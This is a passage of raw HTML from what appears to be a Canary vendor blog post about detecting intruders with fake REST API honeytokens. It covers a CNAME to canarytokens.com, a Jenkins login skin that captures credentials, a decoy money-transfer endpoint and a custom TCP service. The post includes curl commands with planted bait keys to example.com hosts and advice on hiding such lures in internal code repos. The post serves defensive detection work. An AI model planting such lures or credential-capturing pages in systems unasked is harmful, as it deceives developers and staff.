If you are using the free service, you can abstract away the Domain Name by using a DNS CNAME record.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We create a CNAME record in a domain we control. We want api.example.com to resolve to canarytokens.com. We add a CNAME record to point api.example.com to canarytokens.com, so that when the request is made, we still receive the alert!</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 75px; overflow: hidden; width: 624px;\"><img height=\"75\" src=\"https://lh5.googleusercontent.com/mWsRFF7erQ0Ce48O8knXLirzRRveFQVgvwBM3Yep8MRy88hFK2BQGuZhJFLQtDQUG3hvK9CVi8akdY_egLc-frhIeB8MfMUBCIQf_fbmuEaN6rqwM73QCqxyp_E2XZnTyUnmn_ZegmwrkaI8ItynVS4\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Test</span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">curl</span><a href=\"https://www.blogger.com/blog/post/edit/7543234021861076170/6818086009221401416\" style=\"text-decoration: none;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> http://api.example.com/</span></a><span style=\"background-color: white; color: red; font-family: 'Courier New'; font-size: 12pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">ww0mayx9rro4h2l3keazj0zdk</span><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">/</span><a href=\"https://www.blogger.com/blog/post/edit/7543234021861076170/6818086009221401416\" style=\"text-decoration: none;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">api/v1/</span></a><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">endpoint</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Alert:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We can see that we receive the same alert, even though the hostname was changed.\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 345px; overflow: hidden; width: 389px;\"><img height=\"345\" src=\"https://lh4.googleusercontent.com/qebA-l9pDULhHhgo2hjx8DpQQ_adUkUSY_UefK5wf3_Hb5xqCTWLbV0xcG1a4ATfBaWMbC8SkXfoU2yDBtku0vtwcsXLcUmiIGv16jr89GbChidARuObegM46b50KcOg9S6pah46NbwQqqfon4n7mnk\" style=\"margin-left: 0; margin-top: 0;\" width=\"389\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Setup Two: </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Webserver On Canary</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Canaries have a built-in feature that allows you to configure a Webserver on it with a single click. With another click you can choose one of the default HTTP Skins. This is a great way to create an enticing server that attackers may attempt to interact with. Below is a basic example of applying the Jenkins Login HTTP Page Skin. Enable Webserver settings in the Canary Console: </span></span></p>\n<p dir=\"ltr\">\n<div></div>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 225px; overflow: hidden; width: 624px;\"><img height=\"225\" src=\"https://lh4.googleusercontent.com/E-b9X2cG3SIxLlwL-kh4J4j25UV9xxMiTOe6zOerhNul4Uh-GhiMkmrK3SbDR9jZoP4QzfBQ7D3c13sw_RS3-AXh7VjZE4yOL9H3tG9r0nx5okDdbEPh7iu_IMytK8BNzsojKwmBWHp_XzDowFT8XUg\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">When someone browses to the page they will see this.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0; text-align: center;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 349px; overflow: hidden; width: 328px;\"><img height=\"349\" src=\"https://lh6.googleusercontent.com/nTl9KUdI2VwicF7XHuyRJAvDSiuwkLs_l9Qyw8VF2UzlmV37UhZiLQvnxQxiFY98Pp0stkz7pUJY4IAVgiPqpu7Q6v36m_n27sCQ4eVfMrJW6a0OosE5JhkfCtapPvDwg9oARIEtexzW0wZDCXn6-mE\" style=\"margin-left: 0; margin-top: 0;\" width=\"328\" /></span></span></p>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">(By default this exists to capture the credentials an attacker enters &#8211; and lets you know that somebody is messing around where they shouldnt be). A Skin here is simply a set of files, styles, scripts and images that you want to present to a visitor to the page. You can also upload custom skins to create any style you want. But! Even having a basic Canary-website like this allows us to capture REST API request attempts. You can post a reference to the service and usage. This could be in Github or other places with script snippets or command documentation. These are basic examples, but we think you get the idea. Below is a modified example of a REST API that allows you to transfer money between accounts. Place this example near the Accounting or Finance developers and lets see what happens. </span></span></p>\n<div></div>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: black; font-family: Arial; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Test:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">curl <a href=\"http://srv02.example.com/api/v1/transfers\" rel=\"nofollow\">http://srv02.example.com/api/v1/transfers</a> \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0\u00a0-u sk_test_4eC39HqLyjWDarjtT1zdp7dc: \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0\u00a0-d amount=530 \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0\u00a0-d currency=usd \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0\u00a0-d destination=acct_acdcD82eZvKYlo2C8675309 \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0\u00a0-d transfer_group=ORDER_66 \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0\u00a0-v</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Alert:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">When anyone attempts to use this command, we will get the following alert!</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 421px; overflow: hidden; width: 588px;\"><img height=\"421\" src=\"https://lh6.googleusercontent.com/gSyJxoQomlRx8KKv3vwplPayCGvPYDFAyOVIai4O1VvjxmyK59tHOpG7Mnos-0URAqm5aH_DhIFzaBLreOrzzHUMBwEBN6Is8Slzf3qbSOr32VLXH4o-qBiUiKMjSckqxVgU-iz9Zetc3IwfhBn6y5o\" style=\"margin-left: 0; margin-top: 0;\" width=\"588\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: black; font-family: Arial; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">In the above example, we only see the basic attributes of the request. (Canary won\u2019t log the request</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: black; font-family: Arial; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">parameters by default). To capture the POST parameters, we add a custom file. Then alert would include</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: black; font-family: Arial; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">more context: how much money was attempted to be transferred and to which account!</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span id=\"docs-internal-guid-64fccc48-7fff-3b7b-1d34-dacdeddc9180\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 441px; overflow: hidden; width: 624px;\"><img height=\"441\" src=\"https://lh6.googleusercontent.com/oD-F8YYDi_cii2vgyV6mYe_dFb5lA0TUXARQ6k_HtwN5JF8fD8bN5G77fwbqIhMsahPoWlQDs7gXh6Ww6InS7WbnMlVBJeUOtPX7ItnLb9tG53K4Cr0ql2qZz4adNVn6xsxrYDWYwHFai425zGiavoY\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">For more detail on these parameters see this blog post about</span><a href=\"https://help.canary.tools/hc/en-gb/articles/360019295837-Use-a-custom-configuration-file-to-configure-my-custom-webroot\"> <span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">custom webroot configurations.</span></a>\u00a0<span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">In order to capture the POST parameters, we created a Defined Skin, you can read further about this here, </span><a href=\"https://help.canary.tools/hc/en-gb/articles/360002431578-How-do-I-create-a-customized-HTML-login-page-for-HTTP-\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Capturing Incident Data on POSTs</span></a><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Setup Three</span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">: Canarys Custom TCP Service</span><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">In addition to the built-in HTTP Page Skins, Canaries allow you to create a Custom TCP Service that listen on a port you define, and gives you control over various interactions. This allows you to mimic services that may reflect websites or a REST API without using the standard HTTP service (80,443). If you would like to learn more about enabling and configuring a Custom TCP Service, be sure to review be sure to review our</span><a href=\"https://help.canary.tools/hc/en-gb/articles/360002432298-How-do-I-configure-a-custom-TCP-service-\"> <span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Service Configuration</span></a><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"> steps.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We can expand on the basic examples above.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We enable the Custom TCP Service on port 8443 in the Canary Console.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">To make sure we don&#8217;t easily alert for false positives, we can configure the service to only alert when</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">TCP Connections send a string we are expecting by adding it to the Alert String field.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 349px; overflow: hidden; width: 624px;\"><img height=\"349\" src=\"https://lh3.googleusercontent.com/Z8wT6RYCi53j_6ZZOos6HMw_EtpdRgcHNkVc076paWHHhFPFFOsQLnbsShv0SDz2gjyAJdtxABtYbThNs7U7myXr5QtW09M_wEXH1hfw4xwNOLjMTyDoAIlQavRnBSNK5TZrLvBx6728kY4JFLHRT5I\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Test</span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">curl -X POST \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">-H &#8216;X-Auth-Token:15dd7c486d81899f64643d6618c47a4efeedacdc&#8217; \\</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span id=\"docs-internal-guid-60c2fe83-7fff-8790-4e84-0f8006b35af2\"><a href=\"https://www.blogger.com/blog/post/edit/7543234021861076170/6818086009221401416\">http://srv02.example.com:8443/api/v1/resetpwd</a> </span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Alert</span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">:</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 443px; overflow: hidden; width: 624px;\"><img height=\"443\" src=\"https://lh3.googleusercontent.com/8-yuOVqubrysQYbeLRopW3uVAoPf1PcfKjj6F2cFlmGYayKoHSLHwPH41MbcjFpvYQVbk_vIh8lww4Wjg0aHAouwGfcnhvecQmctpH36s4IuJtik3-mCTUKvMaar2vFA30NeMuYVw9pOVeI5NKzL_Ok\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">As we can see, our alert was triggered when the X-Auth-Token string in the Header matched our</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">configured Alert string. The Alert string is not required, if you are interested in alerting on any</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">connection attempts and logging the data sent, then leave the Alert string setting off.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">An additional benefit of a Custom TCP Service is we can create tokens that are context specific.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">The request URI, consists of: {URI-scheme} :// {URI-host} / {resource-path} ? {query-string} .</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Given this is the case, we could create query strings in the request that identify the token.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">curl -G -H\u00a0 &#8220;Authorization: Bearer 15dd7c486d81899f64643d6618c47a4efeedac&#8221; \\</p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"http://srv02.example.com:8443/api/v1/resetpwd/subscriptions\" rel=\"nofollow\">http://srv02.example.com:8443/api/v1/resetpwd/subscriptions</a> \\</p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">-d &#8220;api- version=2014-04-01-preview&#8221; \\</p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">-d &#8220;location=ThisisinStevesAzureADAuthenticationscript&#8221;</p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We never had to create a specific token, we can infer from the Request the key location dynamically. </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We don&#8217;t have to be as obvious in the parameter value either. We simply place these examples in links or </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">in scripts. When the request arrives we receive an alert with the complete HTTP Request.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 501px; overflow: hidden; width: 624px;\"><img height=\"501\" src=\"https://lh4.googleusercontent.com/5V1cjXo5KgmiJ15G3xRclmNeN9JZI6nTHEG9zIUHoc1BXoFRvgUquV6Gqtj6jySHLa1UuJ0akaln9VjXHwzwrXlj_vxLfRfwpdpKAfzGSFP2rFhzTD4RLNT8oZHSQ47vQym-hdmdVrdfjcUvFUkmJm0\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Placement:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">One last topic needs to be considered here. </span><span style=\"font-family: Arial; font-size: 11pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">How would an attacker find these examples, and what might</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">entice them to use them? </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">That is a great question. There are a number of places where details for how to</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">connect to a REST API might show up. Much like opening a document with a Canarytoken or a URL</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Canarytoken. We want to find ways that would cause someone to interact with our fake REST API. Here are a few thoughts and ideas. We would love to hear more about what you come up with as well.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Idea One: </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Place the REST API Canarytoken example in an Internal code repo, disguised as a\u00a0 comment,</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">or a reply or a code snippet.\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 241px; overflow: hidden; width: 624px;\"><img height=\"241\" src=\"https://lh6.googleusercontent.com/EKAmyoMvsMG6Kn3ig8QT2QLyUwsvEnbIm0XDz92FWAsGVeIHCVfQHnji8bZXwc-yuRJ5c2YxeS5it-jylab6kHKdZsztpiztUHkIsVIz4PK8h2ejQgvtycScc7PzcDO8zg9HVbkfDTxlohBDsiSfACQ\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Idea Two: </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Place a link in an internal page that calls out to the specific URL, or a file share, or laptop,</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">that looks like a developers workspace. There are a number of additional references and resources that</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">may also be useful to think about how your organization may find helpful.</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We found the blog below from Detectify to be a helpful resource to get teams started thinking about how</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">an attacker might find and use a REST API endpoint or keys they discover.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 11pt; margin-right: 11pt; margin-top: 0; text-align: center;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 395px; overflow: hidden; width: 609px;\"><img height=\"395\" src=\"https://lh3.googleusercontent.com/LuCW894vtHb_E33RqP5VWXbEE2A3qI1eIyyH5r1qp4D8lFOW7nsKsFdVrnxwdqEVI5hjnG5XFvu6qgKo_YwT9wF-0goN9UjsMZfBxnitdnsdWHuIuk4jALUg94oREbakKBpBrE9LDCXf4KhEE5fMITc\" style=\"margin-left: 0; margin-top: 0;\" width=\"609\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Source: </span><a href=\"https://labs.detectify.com/2021/08/10/how-to-hack-apis-in-2021/\"><span style=\"color: black; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: 